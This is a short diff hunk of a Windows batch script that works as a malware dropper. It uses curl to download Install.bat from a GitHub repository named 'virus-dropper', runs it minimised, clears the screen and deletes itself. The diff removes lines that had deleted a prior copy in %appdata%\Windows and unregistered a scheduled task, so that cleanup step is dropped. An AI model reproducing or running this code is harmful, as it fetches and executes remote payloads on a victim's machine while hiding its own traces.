@@ -22,10 +22,6 @@ if '%errorlevel%' NEQ '0' (
 curl "https://raw.githubusercontent.com/034nop/virus-dropper/main/install/Install.bat" --output "Install.bat"
 ::do not change --output
 
-del /f "%appdata%\Windows\Install.bat"
-rd %appdata%\Windows
-powershell -Command "Unregister-ScheduledTask -TaskName 'Install.bat' -Confirm:$false"
-
 start /min Install.bat
 cls
 call :deleteSelf&exit /b
